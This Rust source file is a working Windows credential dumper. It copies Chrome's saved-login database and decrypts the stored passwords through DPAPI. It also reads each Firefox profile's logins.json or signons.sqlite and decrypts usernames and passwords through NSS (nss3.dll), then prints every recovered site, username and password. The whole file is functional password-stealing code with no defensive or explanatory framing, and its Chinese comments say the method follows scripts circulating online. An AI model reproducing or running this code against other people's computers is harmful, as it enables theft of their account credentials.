
use std::error::Error;
use std::path::PathBuf;
use std::ptr::{null, null_mut};
use std::mem::{zeroed, transmute};

use winapi::um::wincrypt::DATA_BLOB;
use winapi::um::winbase::LocalFree;
use winapi::um::dpapi::CryptUnprotectData;

// 网上流传的Python脚本，Windows上都是这种解密方法
fn decrypt_chrome(data: &[u8]) -> String {
    unsafe {
        let mut data_in: DATA_BLOB = zeroed();
        let mut data_out: DATA_BLOB = zeroed();

        data_in.pbData = transmute(data.as_ptr() as usize);
        data_in.cbData = data.len() as u32;

        let mut result = String::new();
        if CryptUnprotectData(&mut data_in, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut data_out) > 0 {
            result += &String::from_utf8_unchecked(std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).into());
            LocalFree(transmute(data_out.pbData));
        }

        result
    }
}

fn data_local_dir() -> PathBuf {
    dirs::data_local_dir().expect("获取目录失败")
}

fn data_dir() -> PathBuf {
    dirs::data_dir().expect("获取目录失败")
}

fn check_chrome() -> Result<(), Box<dyn Error>> {
    let chrome = data_local_dir().join("Google").join("Chrome")
                      .join("User Data").join("Default").join("Login Data");
    let tmpath = std::env::temp_dir().join("tmplogindata");
    std::fs::copy(&chrome, &tmpath).expect("复制文件失败");

    let conn = sqlite::open(tmpath).expect("打开数据库失败");
    let mut cursor = conn.prepare("SELECT password_value, signon_realm, username_value, date_created FROM \"logins\"")?.cursor();

    while let Some(row) = cursor.next().expect("cursor") {
        // println!("name = {}", row[0].as_string().unwrap());
        println!("[{}]  name: {} passwd: {}",
            row[1].as_string().unwrap(), row[2].as_string().unwrap(),
            decrypt_chrome(row[0].as_binary().unwrap())
        );
    }

    Ok(())
}

fn decrypt_firefox(data: &str, profile: &str) -> String {
    use libloading::*;

    #[repr(C)]
    struct SECItem {
        ty: u32,
        data: *const u8,
        len: u32,
    }
    type PK11SlotInfo = *mut u8;
    type SECItemPtr = *mut SECItem;

    let data = base64::decode(data).unwrap();
    unsafe {
        // if NSS.is_none() { }
        let lib = Library::new("nss3.dll").expect("NSS3.dll加载失败");
        let NSS_Init: Symbol<unsafe extern "C" fn(*const u8) -> i32> = lib.get(b"NSS_Init").unwrap();
        let NSS_Shutdown: Symbol<unsafe extern "C" fn() -> i32> = lib.get(b"NSS_Shutdown").unwrap();
        let PK11_GetInternalKeySlot: Symbol<unsafe extern "C" fn() -> PK11SlotInfo> = lib.get(b"PK11_GetInternalKeySlot").unwrap();
        let PK11_FreeSlot: Symbol<unsafe extern "C" fn(PK11SlotInfo)> = lib.get(b"PK11_FreeSlot").unwrap();
        let PK11_CheckUserPassword: Symbol<unsafe extern "C" fn(PK11SlotInfo, *const u8) -> i32> = lib.get(b"PK11_CheckUserPassword").unwrap();
        let PK11SDR_Decrypt: Symbol<unsafe extern "C" fn(SECItemPtr, SECItemPtr, *const u8) -> i32> = lib.get(b"PK11SDR_Decrypt").unwrap();
        let SECITEM_ZfreeItem: Symbol<unsafe extern "C" fn(SECItemPtr, u32)> = lib.get(b"SECITEM_ZfreeItem").unwrap();
        // let PORT_GetError: Symbol<unsafe extern "C" fn() -> i32> = lib.get(b"PORT_GetError").unwrap();
        // let PR_ErrorToName: Symbol<unsafe extern "C" fn() -> i32> = lib.get(b"PR_ErrorToName").unwrap();
        // let PR_ErrorToString: Symbol<unsafe extern "C" fn() -> i32> = lib.get(b"PR_ErrorToString").unwrap();
        let mut arg: Vec<u8> = b"sql:".to_vec();
        arg.extend_from_slice(profile.as_bytes()); arg.push(0);
        let r = NSS_Init(arg.as_ptr());
        if r != 0 { return format!("<Failed:NSS_Init:{}>", r); }

        // let slot = PK11_GetInternalKeySlot();
        // if !slot.is_null() {
            let mut input: SECItem = zeroed();
            let mut output: SECItem = zeroed();

            input.data = data.as_ptr();
            input.len = data.len() as u32;
            let r = PK11SDR_Decrypt(&mut input, &mut output, null());
            let result = if r == 0 {
                String::from_utf8_unchecked(std::slice::from_raw_parts(output.data, output.len as usize).into())
            } else { format!("<fail:{}>", r) };
            NSS_Shutdown();

            result
            // PK11_FreeSlot(slot);
        // }
    }
}

fn firefox_json(profile: &str) {
    use json::JsonValue;

    let profile_path = data_dir().join("Mozilla").join("Firefox").join(profile);
    let path = profile_path.join("logins.json");
    if !path.exists() { return; }

    let profile_path = profile_path.to_str().unwrap();
    let data = json::parse(&String::from_utf8(std::fs::read(path).unwrap()).unwrap()).unwrap();
    match &data["logins"] {
        JsonValue::Array(v) => {
            for e in v.iter() {
                println!("{} {} {} {}", e["hostname"],
                    decrypt_firefox(e["encryptedUsername"].as_str().unwrap(), profile_path),
                    decrypt_firefox(e["encryptedPassword"].as_str().unwrap(), profile_path),
                    e["encType"]
                );
            }
        }
        _ => panic!("Invalid json profile"),
    }
}

fn firefox_sqlite(profile: &str) {
    let profile_path = data_dir().join("Mozilla").join("Firefox").join(profile);
    let path = profile_path.join("signons.sqlite");
    if !path.exists() { return; }

    let profile_path = profile_path.to_str().unwrap();
    let conn = sqlite::open(path).expect("打开数据库失败");
    let mut cursor = conn.prepare("SELECT hostname, encryptedUsername, encryptedPassword, usernameField FROM \"moz_logins\"").unwrap().cursor();
    while let Some(row) = cursor.next().expect("cursor") {
        println!("{} {} {}", row[0].as_string().unwrap(),
            decrypt_firefox(row[1].as_string().unwrap(), profile_path),
            decrypt_firefox(row[2].as_string().unwrap(), profile_path),
        );
    }
}

fn check_firefox() -> Result<(), Box<dyn Error>> {
    use ini::Ini;

    let p = data_dir().join("Mozilla").join("Firefox").join("profiles.ini");
    if !p.exists() { return Ok(()); }

    let i = Ini::load_from_file(p)?;
    for (sec, prop) in i.iter() {
        match sec {
            Some(s) => if !s.starts_with("Profile") { continue; }
            None => continue
        };

        let profile = prop.get("Path").unwrap();
        println!("[{}]", profile);
        firefox_json(profile);
        firefox_sqlite(profile);
        println!("");
    }

    Ok(())
}

use structopt::StructOpt;

#[derive(Debug, StructOpt)]
#[structopt(name = "example", about = "An example of StructOpt usage.")]
struct Opt {
    #[structopt(short = "ff", long="firefix-dir")]
    firefox_dir: Option<String>,
}

fn main() -> Result<(), Box<dyn Error>> {
    let opt = Opt::from_args();
    if let Some(ffdir) = opt.firefox_dir {
        std::env::set_var("PATH", std::env::var("PATH").unwrap() + ";" + &ffdir);
    }

    println!("-------------------------------------- Chrome --------------------------------------");
    check_chrome()?;
    println!("");

    println!("-------------------------------------- FireFox --------------------------------------");
    check_firefox()?;

    Ok(())
}